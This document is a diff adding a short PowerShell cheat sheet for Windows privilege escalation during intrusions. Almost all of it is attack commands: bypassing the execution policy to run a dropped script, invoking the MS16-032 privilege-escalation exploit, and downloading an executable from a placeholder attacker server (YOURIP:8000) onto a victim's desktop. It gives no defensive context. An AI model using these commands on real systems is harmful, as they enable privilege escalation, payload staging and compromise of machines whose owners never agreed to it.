@@ -1,0 +1,22 @@
+Refference : https://guif.re/windowseop                                                                    
+ _____                       _       _ _    _____     _     _       
+|  _  |___ _ _ _ ___ ___ ___| |_ ___| | |  |_   _|___|_|___| |_ ___ 
+|   __| . | | | | -_|  _|_ -|   | -_| | |    | | |  _| |  _| '_|_ -|
+|__|  |___|_____|___|_| |___|_|_|___|_|_|    |_| |_| |_|___|_,_|___|
+                                                                    
+
+# execute ps script
+
+powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1
+
+#If powershell is blocked, you can download:
+
+https://github.com/Ben0xA/nps
+
+# MS16-032 Explotation
+
+powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+
+# Download file using ps
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/b.exe','C:\Users\YOURUSER\Desktop\b.exe')"
